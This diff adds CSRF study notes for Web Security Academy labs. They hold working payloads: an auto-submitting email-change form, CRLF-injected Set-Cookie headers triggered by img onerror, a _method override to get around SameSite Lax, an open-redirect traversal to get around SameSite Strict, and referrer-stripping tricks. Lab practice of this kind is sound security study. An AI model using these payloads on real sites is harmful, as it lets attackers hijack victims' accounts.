@@ -1,0 +1,49 @@
+Switch POST -> GET
+<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
+    <input type="hidden" name="email" value="anything%40web-security-academy.net">
+</form>
+<script>
+        document.forms[0].submit();
+</script>
+ 
+Delete CSRF Parameter Entirely
+ 
+CSRF Not tied to sessions
+ 
+CSRF tied to cookie
+> csrfKey tied to csrf
+> note that csrfKey reflected in Set-cookie: reflected
+> inject csrfKey into victim
+> url encode the below
+/?search=test
+Set-Cookie: csrfKey=YOUR-KEY; SameSite=None
+<img src="https://insert/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">
+ 
+Duplicate CSRF Token in body and cookie
+> inject csrf to victim, csrf=fake
+> send your_payload
+<img src="https://insert/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
+ 
+Bypass SameSite Lax with Method Override
+> change from post to get
+> add _post method
+<script>
+    document.location = "https://insert/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
+</script>
+ 
+Bypass SameSite Strict with Open redirect: Change email
+> find open redirect -> ?postId=1/../../myaccount/change-email?email=abc&...
+> exploit:
+<script>
+    document.location = "https://yourid/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
+</script>
+ 
+CSRF where validation depends on referrer header being present
+> delete referer header
+> generate PoC and insert the following:
+<meta name="referrer" content="no-referrer">
+ 
+CSRF with url somwhere in referer
+> generate PoC
+> edit: history.pushState("", "", "/?YOUR-LAB-ID.web-security-academy.net")
+> add to head section: Referrer-Policy: unsafe-url
